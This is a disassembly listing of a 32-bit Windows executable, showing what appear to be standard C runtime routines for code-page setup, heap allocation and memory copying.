  424074:	lea    edx,[ebp-0x11]
  424077:	push   edi
  424078:	movzx  ecx,BYTE PTR [edx]
  42407b:	movzx  eax,al
  42407e:	cmp    eax,ecx
  424080:	ja     0x42409f
  424082:	sub    ecx,eax
  424084:	inc    ecx
  424085:	mov    ebx,ecx
  424087:	shr    ecx,0x2
  42408a:	lea    edi,[ebp+eax*1-0x118]
  424091:	mov    eax,0x20202020
  424096:	rep stos DWORD PTR es:[edi],eax
  424098:	mov    ecx,ebx
  42409a:	and    ecx,0x3
  42409d:	rep stos BYTE PTR es:[edi],al
  42409f:	inc    edx
  4240a0:	mov    al,BYTE PTR [edx]
  4240a2:	inc    edx
  4240a3:	test   al,al
  4240a5:	jne    0x424078
  4240a7:	pop    edi
  4240a8:	pop    ebx
  4240a9:	push   0x0
  4240ab:	push   DWORD PTR ds:0x45cf14
  4240b1:	lea    eax,[ebp-0x518]
  4240b7:	push   DWORD PTR ds:0x45d024
  4240bd:	push   eax
  4240be:	push   esi
  4240bf:	lea    eax,[ebp-0x118]
  4240c5:	push   eax
  4240c6:	push   0x1
  4240c8:	call   0x425fd8
  4240cd:	push   0x0
  4240cf:	push   DWORD PTR ds:0x45d024
  4240d5:	lea    eax,[ebp-0x218]
  4240db:	push   esi
  4240dc:	push   eax
  4240dd:	push   esi
  4240de:	lea    eax,[ebp-0x118]
  4240e4:	push   eax
  4240e5:	push   esi
  4240e6:	push   DWORD PTR ds:0x45cf14
  4240ec:	call   0x425c1c
  4240f1:	push   0x0
  4240f3:	push   DWORD PTR ds:0x45d024
  4240f9:	lea    eax,[ebp-0x318]
  4240ff:	push   esi
  424100:	push   eax
  424101:	push   esi
  424102:	lea    eax,[ebp-0x118]
  424108:	push   eax
  424109:	push   0x200
  42410e:	push   DWORD PTR ds:0x45cf14
  424114:	call   0x425c1c
  424119:	add    esp,0x5c
  42411c:	xor    eax,eax
  42411e:	mov    cx,WORD PTR [ebp+eax*2-0x518]
  424126:	test   cl,0x1
  424129:	je     0x424141
  42412b:	or     BYTE PTR [eax+0x45cf21],0x10
  424132:	mov    cl,BYTE PTR [ebp+eax*1-0x218]
  424139:	mov    BYTE PTR [eax+0x45d040],cl
  42413f:	jmp    0x42415d
  424141:	test   cl,0x2
  424144:	je     0x424156
  424146:	or     BYTE PTR [eax+0x45cf21],0x20
  42414d:	mov    cl,BYTE PTR [ebp+eax*1-0x318]
  424154:	jmp    0x424139
  424156:	and    BYTE PTR [eax+0x45d040],0x0
  42415d:	inc    eax
  42415e:	cmp    eax,esi
  424160:	jb     0x42411e
  424162:	jmp    0x4241a8
  424164:	xor    eax,eax
  424166:	cmp    eax,0x41
  424169:	jb     0x424184
  42416b:	cmp    eax,0x5a
  42416e:	ja     0x424184
  424170:	or     BYTE PTR [eax+0x45cf21],0x10
  424177:	mov    cl,al
  424179:	add    cl,0x20
  42417c:	mov    BYTE PTR [eax+0x45d040],cl
  424182:	jmp    0x4241a3
  424184:	cmp    eax,0x61
  424187:	jb     0x42419c
  424189:	cmp    eax,0x7a
  42418c:	ja     0x42419c
  42418e:	or     BYTE PTR [eax+0x45cf21],0x20
  424195:	mov    cl,al
  424197:	sub    cl,0x20
  42419a:	jmp    0x42417c
  42419c:	and    BYTE PTR [eax+0x45d040],0x0
  4241a3:	inc    eax
  4241a4:	cmp    eax,esi
  4241a6:	jb     0x424166
  4241a8:	mov    ecx,DWORD PTR [ebp-0x4]
  4241ab:	xor    ecx,DWORD PTR [ebp+0x4]
  4241ae:	pop    esi
  4241af:	call   0x423f7c
  4241b4:	leave  
  4241b5:	ret    
  4241b6:	push   ebp
  4241b7:	mov    ebp,esp
  4241b9:	sub    esp,0x1c
  4241bc:	mov    eax,ds:0x45c430
  4241c1:	xor    eax,DWORD PTR [ebp+0x4]
  4241c4:	push   ebx
  4241c5:	push   esi
  4241c6:	mov    esi,DWORD PTR [ebp+0x8]
  4241c9:	xor    ebx,ebx
  4241cb:	cmp    esi,ebx
  4241cd:	mov    DWORD PTR [ebp-0x4],eax
  4241d0:	push   edi
  4241d1:	je     0x42432b
  4241d7:	xor    edx,edx
  4241d9:	xor    eax,eax
  4241db:	cmp    DWORD PTR [eax+0x45c440],esi
  4241e1:	je     0x424248
  4241e3:	add    eax,0x30
  4241e6:	inc    edx
  4241e7:	cmp    eax,0xf0
  4241ec:	jb     0x4241db
  4241ee:	lea    eax,[ebp-0x1c]
  4241f1:	push   eax
  4241f2:	push   esi
  4241f3:	call   DWORD PTR ds:0x4280a4
  4241f9:	cmp    eax,0x1
  4241fc:	jne    0x424323
  424202:	push   0x40
  424204:	xor    eax,eax
  424206:	cmp    DWORD PTR [ebp-0x1c],0x1
  42420a:	pop    ecx
  42420b:	mov    edi,0x45cf20
  424210:	rep stos DWORD PTR es:[edi],eax
  424212:	stos   BYTE PTR es:[edi],al
  424213:	mov    DWORD PTR ds:0x45d024,esi
  424219:	mov    DWORD PTR ds:0x45cf14,ebx
  42421f:	jbe    0x424311
  424225:	cmp    BYTE PTR [ebp-0x16],0x0
  424229:	je     0x4242e9
  42422f:	lea    ecx,[ebp-0x15]
  424232:	mov    dl,BYTE PTR [ecx]
  424234:	test   dl,dl
  424236:	je     0x4242e9
  42423c:	movzx  eax,BYTE PTR [ecx-0x1]
  424240:	movzx  edx,dl
  424243:	jmp    0x4242d9
  424248:	push   0x40
  42424a:	xor    eax,eax
  42424c:	pop    ecx
  42424d:	mov    edi,0x45cf20
  424252:	rep stos DWORD PTR es:[edi],eax
  424254:	lea    ecx,[edx+edx*2]
  424257:	shl    ecx,0x4
  42425a:	mov    DWORD PTR [ebp-0x8],ebx
  42425d:	stos   BYTE PTR es:[edi],al
  42425e:	lea    ebx,[ecx+0x45c450]
  424264:	mov    al,BYTE PTR [ebx]
  424266:	mov    esi,ebx
  424268:	jmp    0x424293
  42426a:	mov    dl,BYTE PTR [esi+0x1]
  42426d:	test   dl,dl
  42426f:	je     0x424297
  424271:	movzx  eax,al
  424274:	movzx  edi,dl
  424277:	cmp    eax,edi
  424279:	ja     0x42428f
  42427b:	mov    edx,DWORD PTR [ebp-0x8]
  42427e:	mov    dl,BYTE PTR [edx+0x45c438]
  424284:	or     BYTE PTR [eax+0x45cf21],dl
  42428a:	inc    eax
  42428b:	cmp    eax,edi
  42428d:	jbe    0x424284
  42428f:	inc    esi
  424290:	inc    esi
  424291:	mov    al,BYTE PTR [esi]
  424293:	test   al,al
  424295:	jne    0x42426a
  424297:	inc    DWORD PTR [ebp-0x8]
  42429a:	add    ebx,0x8
  42429d:	cmp    DWORD PTR [ebp-0x8],0x4
  4242a1:	jb     0x424264
  4242a3:	mov    eax,DWORD PTR [ebp+0x8]
  4242a6:	mov    ds:0x45d024,eax
  4242ab:	mov    DWORD PTR ds:0x45cf1c,0x1
  4242b5:	call   0x423fcc
  4242ba:	lea    ecx,[ecx+0x45c444]
  4242c0:	mov    esi,ecx
  4242c2:	mov    edi,0x45d030
  4242c7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4242c8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4242c9:	mov    ds:0x45cf14,eax
  4242ce:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4242cf:	jmp    0x424330
  4242d1:	or     BYTE PTR [eax+0x45cf21],0x4
  4242d8:	inc    eax
  4242d9:	cmp    eax,edx
  4242db:	jbe    0x4242d1
  4242dd:	inc    ecx
  4242de:	inc    ecx
  4242df:	cmp    BYTE PTR [ecx-0x1],0x0
  4242e3:	jne    0x424232
  4242e9:	xor    ecx,ecx
  4242eb:	inc    ecx
  4242ec:	mov    eax,ecx
  4242ee:	or     BYTE PTR [eax+0x45cf21],0x8
  4242f5:	inc    eax
  4242f6:	cmp    eax,0xff
  4242fb:	jb     0x4242ee
  4242fd:	mov    eax,esi
  4242ff:	call   0x423fcc
  424304:	mov    ds:0x45cf14,eax
  424309:	mov    DWORD PTR ds:0x45cf1c,ecx
  42430f:	jmp    0x424317
  424311:	mov    DWORD PTR ds:0x45cf1c,ebx
  424317:	xor    eax,eax
  424319:	mov    edi,0x45d030
  42431e:	stos   DWORD PTR es:[edi],eax
  42431f:	stos   DWORD PTR es:[edi],eax
  424320:	stos   DWORD PTR es:[edi],eax
  424321:	jmp    0x424330
  424323:	cmp    DWORD PTR ds:0x45cd84,ebx
  424329:	je     0x424339
  42432b:	call   0x423ffb
  424330:	call   0x424024
  424335:	xor    eax,eax
  424337:	jmp    0x42433c
  424339:	or     eax,0xffffffff
  42433c:	mov    ecx,DWORD PTR [ebp-0x4]
  42433f:	xor    ecx,DWORD PTR [ebp+0x4]
  424342:	pop    edi
  424343:	pop    esi
  424344:	pop    ebx
  424345:	call   0x423f7c
  42434a:	leave  
  42434b:	ret    
  42434c:	push   0x14
  42434e:	push   0x428558
  424353:	call   0x4238a8
  424358:	or     DWORD PTR [ebp-0x1c],0xffffffff
  42435c:	push   0xd
  42435e:	call   0x423a6f
  424363:	pop    ecx
  424364:	xor    edi,edi
  424366:	mov    DWORD PTR [ebp-0x4],edi
  424369:	mov    DWORD PTR ds:0x45cd84,edi
  42436f:	mov    eax,DWORD PTR [ebp+0x8]
  424372:	cmp    eax,0xfffffffe
  424375:	jne    0x424389
  424377:	mov    DWORD PTR ds:0x45cd84,0x1
  424381:	call   DWORD PTR ds:0x4280a0
  424387:	jmp    0x4243b4
  424389:	cmp    eax,0xfffffffd
  42438c:	jne    0x4243a0
  42438e:	mov    DWORD PTR ds:0x45cd84,0x1
  424398:	call   DWORD PTR ds:0x42809c
  42439e:	jmp    0x4243b4
  4243a0:	cmp    eax,0xfffffffc
  4243a3:	jne    0x4243b4
  4243a5:	mov    DWORD PTR ds:0x45cd84,0x1
  4243af:	mov    eax,ds:0x45cdb4
  4243b4:	mov    DWORD PTR [ebp+0x8],eax
  4243b7:	cmp    eax,DWORD PTR ds:0x45d024
  4243bd:	je     0x42447e
  4243c3:	mov    esi,DWORD PTR ds:0x45cf18
  4243c9:	mov    DWORD PTR [ebp-0x20],esi
  4243cc:	cmp    esi,edi
  4243ce:	je     0x4243d4
  4243d0:	cmp    DWORD PTR [esi],edi
  4243d2:	je     0x4243e4
  4243d4:	push   0x220
  4243d9:	call   0x4245d2
  4243de:	pop    ecx
  4243df:	mov    esi,eax
  4243e1:	mov    DWORD PTR [ebp-0x20],esi
  4243e4:	cmp    esi,edi
  4243e6:	je     0x424467
  4243e8:	push   DWORD PTR [ebp+0x8]
  4243eb:	call   0x4241b6
  4243f0:	pop    ecx
  4243f1:	mov    DWORD PTR [ebp-0x1c],eax
  4243f4:	cmp    eax,edi
  4243f6:	jne    0x424467
  4243f8:	mov    DWORD PTR [esi],edi
  4243fa:	mov    eax,ds:0x45d024
  4243ff:	mov    DWORD PTR [esi+0x4],eax
  424402:	mov    eax,ds:0x45cf1c
  424407:	mov    DWORD PTR [esi+0x8],eax
  42440a:	mov    eax,ds:0x45cf14
  42440f:	mov    DWORD PTR [esi+0xc],eax
  424412:	xor    eax,eax
  424414:	mov    DWORD PTR [ebp-0x24],eax
  424417:	cmp    eax,0x5
  42441a:	jge    0x42442c
  42441c:	mov    cx,WORD PTR [eax*2+0x45d030]
  424424:	mov    WORD PTR [esi+eax*2+0x10],cx
  424429:	inc    eax
  42442a:	jmp    0x424414
  42442c:	xor    eax,eax
  42442e:	mov    DWORD PTR [ebp-0x24],eax
  424431:	cmp    eax,0x101
  424436:	jge    0x424445
  424438:	mov    cl,BYTE PTR [eax+0x45cf20]
  42443e:	mov    BYTE PTR [eax+esi*1+0x1c],cl
  424442:	inc    eax
  424443:	jmp    0x42442e
  424445:	xor    eax,eax
  424447:	mov    DWORD PTR [ebp-0x24],eax
  42444a:	cmp    eax,0x100
  42444f:	jge    0x424461
  424451:	mov    cl,BYTE PTR [eax+0x45d040]
  424457:	mov    BYTE PTR [eax+esi*1+0x11d],cl
  42445e:	inc    eax
  42445f:	jmp    0x424447
  424461:	mov    DWORD PTR ds:0x45cf18,esi
  424467:	cmp    DWORD PTR [ebp-0x1c],0xffffffff
  42446b:	jne    0x424481
  42446d:	cmp    esi,DWORD PTR ds:0x45cf18
  424473:	je     0x424481
  424475:	push   esi
  424476:	call   0x4244ba
  42447b:	pop    ecx
  42447c:	jmp    0x424481
  42447e:	mov    DWORD PTR [ebp-0x1c],edi
  424481:	or     DWORD PTR [ebp-0x4],0xffffffff
  424485:	call   0x424493
  42448a:	mov    eax,DWORD PTR [ebp-0x1c]
  42448d:	call   0x4238e3
  424492:	ret    
  424493:	push   0xd
  424495:	call   0x4239db
  42449a:	pop    ecx
  42449b:	ret    
  42449c:	cmp    DWORD PTR ds:0x45d26c,0x0
  4244a3:	jne    0x4244b7
  4244a5:	push   0xfffffffd
  4244a7:	call   0x42434c
  4244ac:	pop    ecx
  4244ad:	mov    DWORD PTR ds:0x45d26c,0x1
  4244b7:	xor    eax,eax
  4244b9:	ret    
  4244ba:	push   0xc
  4244bc:	push   0x428568
  4244c1:	call   0x4238a8
  4244c6:	mov    esi,DWORD PTR [ebp+0x8]
  4244c9:	test   esi,esi
  4244cb:	je     0x424525
  4244cd:	cmp    DWORD PTR ds:0x45d144,0x3
  4244d4:	jne    0x424516
  4244d6:	push   0x4
  4244d8:	call   0x423a6f
  4244dd:	pop    ecx
  4244de:	and    DWORD PTR [ebp-0x4],0x0
  4244e2:	push   esi
  4244e3:	call   0x424c92
  4244e8:	pop    ecx
  4244e9:	mov    DWORD PTR [ebp-0x1c],eax
  4244ec:	test   eax,eax
  4244ee:	je     0x4244f9
  4244f0:	push   esi
  4244f1:	push   eax
  4244f2:	call   0x424cbd
  4244f7:	pop    ecx
  4244f8:	pop    ecx
  4244f9:	or     DWORD PTR [ebp-0x4],0xffffffff
  4244fd:	call   0x42450d
  424502:	cmp    DWORD PTR [ebp-0x1c],0x0
  424506:	jne    0x424525
  424508:	push   DWORD PTR [ebp+0x8]
  42450b:	jmp    0x424517
  42450d:	push   0x4
  42450f:	call   0x4239db
  424514:	pop    ecx
  424515:	ret    
  424516:	push   esi
  424517:	push   0x0
  424519:	push   DWORD PTR ds:0x45d140
  42451f:	call   DWORD PTR ds:0x42808c
  424525:	call   0x4238e3
  42452a:	ret    
  42452b:	push   0xc
  42452d:	push   0x428578
  424532:	call   0x4238a8
  424537:	mov    esi,DWORD PTR [ebp+0x8]
  42453a:	cmp    DWORD PTR ds:0x45d144,0x3
  424541:	jne    0x424571
  424543:	cmp    esi,DWORD PTR ds:0x45cf04
  424549:	ja     0x424571
  42454b:	push   0x4
  42454d:	call   0x423a6f
  424552:	pop    ecx
  424553:	and    DWORD PTR [ebp-0x4],0x0
  424557:	push   esi
  424558:	call   0x425471
  42455d:	pop    ecx
  42455e:	mov    DWORD PTR [ebp-0x1c],eax
  424561:	or     DWORD PTR [ebp-0x4],0xffffffff
  424565:	call   0x42459d
  42456a:	mov    eax,DWORD PTR [ebp-0x1c]
  42456d:	test   eax,eax
  42456f:	jne    0x424594
  424571:	test   esi,esi
  424573:	jne    0x424576
  424575:	inc    esi
  424576:	cmp    DWORD PTR ds:0x45d144,0x1
  42457d:	je     0x424585
  42457f:	add    esi,0xf
  424582:	and    esi,0xfffffff0
  424585:	push   esi
  424586:	push   0x0
  424588:	push   DWORD PTR ds:0x45d140
  42458e:	call   DWORD PTR ds:0x4280a8
  424594:	call   0x4238e3
  424599:	ret    
  42459a:	mov    esi,DWORD PTR [ebp+0x8]
  42459d:	push   0x4
  42459f:	call   0x4239db
  4245a4:	pop    ecx
  4245a5:	ret    
  4245a6:	cmp    DWORD PTR [esp+0x4],0xffffffe0
  4245ab:	ja     0x4245cf
  4245ad:	push   DWORD PTR [esp+0x4]
  4245b1:	call   0x42452b
  4245b6:	test   eax,eax
  4245b8:	pop    ecx
  4245b9:	jne    0x4245d1
  4245bb:	cmp    DWORD PTR [esp+0x8],eax
  4245bf:	je     0x4245d1
  4245c1:	push   DWORD PTR [esp+0x4]
  4245c5:	call   0x426192
  4245ca:	test   eax,eax
  4245cc:	pop    ecx
  4245cd:	jne    0x4245ad
  4245cf:	xor    eax,eax
  4245d1:	ret    
  4245d2:	push   DWORD PTR ds:0x45cdc8
  4245d8:	push   DWORD PTR [esp+0x8]
  4245dc:	call   0x4245a6
  4245e1:	pop    ecx
  4245e2:	pop    ecx
  4245e3:	ret    
  4245e4:	int3   
  4245e5:	int3   
  4245e6:	int3   
  4245e7:	int3   
  4245e8:	int3   
  4245e9:	int3   
  4245ea:	int3   
  4245eb:	int3   
  4245ec:	int3   
  4245ed:	int3   
  4245ee:	int3   
  4245ef:	int3   
  4245f0:	push   ebp
  4245f1:	mov    ebp,esp
  4245f3:	push   edi
  4245f4:	push   esi
  4245f5:	mov    esi,DWORD PTR [ebp+0xc]
  4245f8:	mov    ecx,DWORD PTR [ebp+0x10]
  4245fb:	mov    edi,DWORD PTR [ebp+0x8]
  4245fe:	mov    eax,ecx
  424600:	mov    edx,ecx
  424602:	add    eax,esi
  424604:	cmp    edi,esi
  424606:	jbe    0x424610
  424608:	cmp    edi,eax
  42460a:	jb     0x42478c
  424610:	test   edi,0x3
  424616:	jne    0x42462c
  424618:	shr    ecx,0x2
  42461b:	and    edx,0x3
  42461e:	cmp    ecx,0x8
  424621:	jb     0x42464c
  424623:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424625:	jmp    DWORD PTR [edx*4+0x42473c]
  42462c:	mov    eax,edi
  42462e:	mov    edx,0x3
  424633:	sub    ecx,0x4
  424636:	jb     0x424644
  424638:	and    eax,0x3
  42463b:	add    ecx,eax
  42463d:	jmp    DWORD PTR [eax*4+0x424650]
  424644:	jmp    DWORD PTR [ecx*4+0x42474c]
  42464b:	nop
  42464c:	jmp    DWORD PTR [ecx*4+0x4246d0]
  424653:	nop
  424654:	pusha  
  424655:	inc    esi
  424656:	inc    edx
  424657:	add    BYTE PTR [esi+eax*2+0x46b00042],cl
  42465e:	inc    edx
  42465f:	add    BYTE PTR [ebx],ah
  424661:	ror    DWORD PTR [edx-0x75f877fa],1
  424667:	inc    esi
  424668:	add    DWORD PTR [eax+0x468a0147],ecx
  42466e:	add    al,cl
  424670:	jmp    0x289ce77
  424675:	add    esi,0x3
  424678:	add    edi,0x3
  42467b:	cmp    ecx,0x8
  42467e:	jb     0x42464c
  424680:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424682:	jmp    DWORD PTR [edx*4+0x42473c]
  424689:	lea    ecx,[ecx+0x0]
  42468c:	and    edx,ecx
  42468e:	mov    al,BYTE PTR [esi]
  424690:	mov    BYTE PTR [edi],al
  424692:	mov    al,BYTE PTR [esi+0x1]
  424695:	shr    ecx,0x2
  424698:	mov    BYTE PTR [edi+0x1],al
  42469b:	add    esi,0x2
  42469e:	add    edi,0x2
  4246a1:	cmp    ecx,0x8
  4246a4:	jb     0x42464c
  4246a6:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4246a8:	jmp    DWORD PTR [edx*4+0x42473c]
  4246af:	nop
  4246b0:	and    edx,ecx
  4246b2:	mov    al,BYTE PTR [esi]
  4246b4:	mov    BYTE PTR [edi],al
  4246b6:	add    esi,0x1
  4246b9:	shr    ecx,0x2
  4246bc:	add    edi,0x1
  4246bf:	cmp    ecx,0x8
  4246c2:	jb     0x42464c
  4246c4:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4246c6:	jmp    DWORD PTR [edx*4+0x42473c]
  4246cd:	lea    ecx,[ecx+0x0]
  4246d0:	xor    eax,DWORD PTR [edi+0x42]
  4246d3:	add    BYTE PTR [eax],ah
  4246d5:	inc    edi
  4246d6:	inc    edx
  4246d7:	add    BYTE PTR [eax],bl
  4246d9:	inc    edi
  4246da:	inc    edx
  4246db:	add    BYTE PTR [eax],dl
  4246dd:	inc    edi
  4246de:	inc    edx
  4246df:	add    BYTE PTR [eax],cl
  4246e1:	inc    edi
  4246e2:	inc    edx
  4246e3:	add    BYTE PTR [eax],al
  4246e5:	inc    edi
  4246e6:	inc    edx
  4246e7:	add    al,bh
  4246e9:	inc    esi
  4246ea:	inc    edx
  4246eb:	add    al,dh
  4246ed:	inc    esi
  4246ee:	inc    edx
  4246ef:	add    BYTE PTR [ebx-0x761b71bc],cl
  4246f5:	inc    esp
  4246f6:	(bad)  
  4246f7:	in     al,0x8b
  4246f9:	inc    esp
  4246fa:	mov    gs,eax
  4246fc:	mov    DWORD PTR [edi+ecx*4-0x18],eax
  424700:	mov    eax,DWORD PTR [esi+ecx*4-0x14]
  424704:	mov    DWORD PTR [edi+ecx*4-0x14],eax
  424708:	mov    eax,DWORD PTR [esi+ecx*4-0x10]
  42470c:	mov    DWORD PTR [edi+ecx*4-0x10],eax
  424710:	mov    eax,DWORD PTR [esi+ecx*4-0xc]
  424714:	mov    DWORD PTR [edi+ecx*4-0xc],eax
  424718:	mov    eax,DWORD PTR [esi+ecx*4-0x8]
  42471c:	mov    DWORD PTR [edi+ecx*4-0x8],eax
  424720:	mov    eax,DWORD PTR [esi+ecx*4-0x4]
  424724:	mov    DWORD PTR [edi+ecx*4-0x4],eax
  424728:	lea    eax,[ecx*4+0x0]
  42472f:	add    esi,eax
  424731:	add    edi,eax
  424733:	jmp    DWORD PTR [edx*4+0x42473c]
  42473a:	mov    edi,edi
  42473c:	dec    esp
  42473d:	inc    edi
  42473e:	inc    edx
  42473f:	add    BYTE PTR [edi+eax*2+0x42],dl
  424743:	add    BYTE PTR [eax+0x47],ah
  424746:	inc    edx
  424747:	add    BYTE PTR [edi+eax*2+0x42],dh
  42474b:	add    BYTE PTR [ebx+0x5f5e0845],cl
  424751:	leave  
  424752:	ret    
  424753:	nop
  424754:	mov    al,BYTE PTR [esi]
  424756:	mov    BYTE PTR [edi],al
  424758:	mov    eax,DWORD PTR [ebp+0x8]
  42475b:	pop    esi
  42475c:	pop    edi
  42475d:	leave  
  42475e:	ret    
  42475f:	nop
  424760:	mov    al,BYTE PTR [esi]
  424762:	mov    BYTE PTR [edi],al
  424764:	mov    al,BYTE PTR [esi+0x1]
  424767:	mov    BYTE PTR [edi+0x1],al
  42476a:	mov    eax,DWORD PTR [ebp+0x8]
  42476d:	pop    esi
  42476e:	pop    edi
  42476f:	leave  
  424770:	ret    
  424771:	lea    ecx,[ecx+0x0]
  424774:	mov    al,BYTE PTR [esi]
  424776:	mov    BYTE PTR [edi],al
  424778:	mov    al,BYTE PTR [esi+0x1]
  42477b:	mov    BYTE PTR [edi+0x1],al
  42477e:	mov    al,BYTE PTR [esi+0x2]
  424781:	mov    BYTE PTR [edi+0x2],al
  424784:	mov    eax,DWORD PTR [ebp+0x8]
  424787:	pop    esi
  424788:	pop    edi
  424789:	leave  
  42478a:	ret    
  42478b:	nop
  42478c:	lea    esi,[ecx+esi*1-0x4]
  424790:	lea    edi,[ecx+edi*1-0x4]
  424794:	test   edi,0x3
  42479a:	jne    0x4247c0
  42479c:	shr    ecx,0x2
  42479f:	and    edx,0x3
  4247a2:	cmp    ecx,0x8
  4247a5:	jb     0x4247b4
  4247a7:	std    
  4247a8:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4247aa:	cld    
  4247ab:	jmp    DWORD PTR [edx*4+0x4248d8]
  4247b2:	mov    edi,edi
  4247b4:	neg    ecx
  4247b6:	jmp    DWORD PTR [ecx*4+0x424888]
  4247bd:	lea    ecx,[ecx+0x0]
  4247c0:	mov    eax,edi
  4247c2:	mov    edx,0x3
  4247c7:	cmp    ecx,0x4
  4247ca:	jb     0x4247d8
  4247cc:	and    eax,0x3
  4247cf:	sub    ecx,eax
  4247d1:	jmp    DWORD PTR [eax*4+0x4247dc]
  4247d8:	jmp    DWORD PTR [ecx*4+0x4248d8]
  4247df:	nop
  4247e0:	in     al,dx
  4247e1:	inc    edi
  4247e2:	inc    edx
  4247e3:	add    BYTE PTR [eax],dl
  4247e5:	dec    eax
  4247e6:	inc    edx
  4247e7:	add    BYTE PTR [eax],bh
  4247e9:	dec    eax
  4247ea:	inc    edx
  4247eb:	add    BYTE PTR [edx-0x2edcfcba],cl
  4247f1:	mov    BYTE PTR [edi+0x3],al
  4247f4:	sub    esi,0x1
  4247f7:	shr    ecx,0x2
  4247fa:	sub    edi,0x1
  4247fd:	cmp    ecx,0x8
  424800:	jb     0x4247b4
  424802:	std    
  424803:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424805:	cld    
  424806:	jmp    DWORD PTR [edx*4+0x4248d8]
  42480d:	lea    ecx,[ecx+0x0]
  424810:	mov    al,BYTE PTR [esi+0x3]
  424813:	and    edx,ecx
  424815:	mov    BYTE PTR [edi+0x3],al
  424818:	mov    al,BYTE PTR [esi+0x2]
  42481b:	shr    ecx,0x2
  42481e:	mov    BYTE PTR [edi+0x2],al
  424821:	sub    esi,0x2
  424824:	sub    edi,0x2
  424827:	cmp    ecx,0x8
  42482a:	jb     0x4247b4
  42482c:	std    
  42482d:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42482f:	cld    
  424830:	jmp    DWORD PTR [edx*4+0x4248d8]
  424837:	nop
  424838:	mov    al,BYTE PTR [esi+0x3]
  42483b:	and    edx,ecx
  42483d:	mov    BYTE PTR [edi+0x3],al
  424840:	mov    al,BYTE PTR [esi+0x2]
  424843:	mov    BYTE PTR [edi+0x2],al
  424846:	mov    al,BYTE PTR [esi+0x1]
  424849:	shr    ecx,0x2
  42484c:	mov    BYTE PTR [edi+0x1],al
  42484f:	sub    esi,0x3
  424852:	sub    edi,0x3
  424855:	cmp    ecx,0x8
  424858:	jb     0x4247b4
  42485e:	std    
  42485f:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424861:	cld    
  424862:	jmp    DWORD PTR [edx*4+0x4248d8]
  424869:	lea    ecx,[ecx+0x0]
  42486c:	mov    WORD PTR [eax+0x42],cs
  42486f:	add    BYTE PTR [eax+ecx*2+0x489c0042],dl
  424876:	inc    edx
  424877:	add    BYTE PTR [eax+ecx*2+0x48ac0042],ah
  42487e:	inc    edx
  42487f:	add    BYTE PTR [eax+ecx*2+0x48bc0042],dh
  424886:	inc    edx
  424887:	add    bh,cl
  424889:	dec    eax
  42488a:	inc    edx
  42488b:	add    BYTE PTR [ebx-0x76e371bc],cl
  424891:	inc    esp
  424892:	(bad)  
  424893:	sbb    al,0x8b
  424895:	inc    esp
  424896:	mov    ds,WORD PTR [eax]
  424898:	mov    DWORD PTR [edi+ecx*4+0x18],eax
  42489c:	mov    eax,DWORD PTR [esi+ecx*4+0x14]
  4248a0:	mov    DWORD PTR [edi+ecx*4+0x14],eax
  4248a4:	mov    eax,DWORD PTR [esi+ecx*4+0x10]
  4248a8:	mov    DWORD PTR [edi+ecx*4+0x10],eax
  4248ac:	mov    eax,DWORD PTR [esi+ecx*4+0xc]
  4248b0:	mov    DWORD PTR [edi+ecx*4+0xc],eax
  4248b4:	mov    eax,DWORD PTR [esi+ecx*4+0x8]
  4248b8:	mov    DWORD PTR [edi+ecx*4+0x8],eax
  4248bc:	mov    eax,DWORD PTR [esi+ecx*4+0x4]
  4248c0:	mov    DWORD PTR [edi+ecx*4+0x4],eax
  4248c4:	lea    eax,[ecx*4+0x0]
  4248cb:	add    esi,eax
  4248cd:	add    edi,eax
  4248cf:	jmp    DWORD PTR [edx*4+0x4248d8]
  4248d6:	mov    edi,edi
  4248d8:	call   0xf0428b25
  4248dd:	dec    eax
  4248de:	inc    edx
  4248df:	add    BYTE PTR [eax],al
  4248e1:	dec    ecx
  4248e2:	inc    edx
  4248e3:	add    BYTE PTR [ecx+ecx*2],dl
  4248e6:	inc    edx
  4248e7:	add    BYTE PTR [ebx+0x5f5e0845],cl
  4248ed:	leave  
  4248ee:	ret    
  4248ef:	nop
  4248f0:	mov    al,BYTE PTR [esi+0x3]
  4248f3:	mov    BYTE PTR [edi+0x3],al
  4248f6:	mov    eax,DWORD PTR [ebp+0x8]
  4248f9:	pop    esi
  4248fa:	pop    edi
  4248fb:	leave  
  4248fc:	ret    
  4248fd:	lea    ecx,[ecx+0x0]
  424900:	mov    al,BYTE PTR [esi+0x3]
  424903:	mov    BYTE PTR [edi+0x3],al
  424906:	mov    al,BYTE PTR [esi+0x2]
  424909:	mov    BYTE PTR [edi+0x2],al
  42490c:	mov    eax,DWORD PTR [ebp+0x8]
  42490f:	pop    esi
  424910:	pop    edi
  424911:	leave  
  424912:	ret    
  424913:	nop
  424914:	mov    al,BYTE PTR [esi+0x3]
  424917:	mov    BYTE PTR [edi+0x3],al
  42491a:	mov    al,BYTE PTR [esi+0x2]
  42491d:	mov    BYTE PTR [edi+0x2],al
  424920:	mov    al,BYTE PTR [esi+0x1]
  424923:	mov    BYTE PTR [edi+0x1],al
  424926:	mov    eax,DWORD PTR [ebp+0x8]
  424929:	pop    esi
  42492a:	pop    edi
  42492b:	leave  
  42492c:	ret    
  42492d:	push   DWORD PTR [esp+0x4]
  424931:	call   DWORD PTR ds:0x4280ac
  424937:	xor    eax,eax
  424939:	inc    eax
  42493a:	ret    0x8
  42493d:	push   0x10
  42493f:	push   0x4285c0
  424944:	call   0x4238a8
  424949:	mov    eax,ds:0x45cd88
  42494e:	test   eax,eax
  424950:	jne    0x424989
  424952:	cmp    DWORD PTR ds:0x45cac4,0x1
  424959:	je     0x42497f
  42495b:	push   0x4285ac
  424960:	call   DWORD PTR ds:0x428018
  424966:	test   eax,eax
  424968:	je     0x42497f
  42496a:	push   0x428584
  42496f:	push   eax
  424970:	call   DWORD PTR ds:0x42801c
  424976:	mov    ds:0x45cd88,eax
  42497b:	test   eax,eax
  42497d:	jne    0x424989
  42497f:	mov    eax,0x42492d
  424984:	mov    ds:0x45cd88,eax
  424989:	and    DWORD PTR [ebp-0x4],0x0
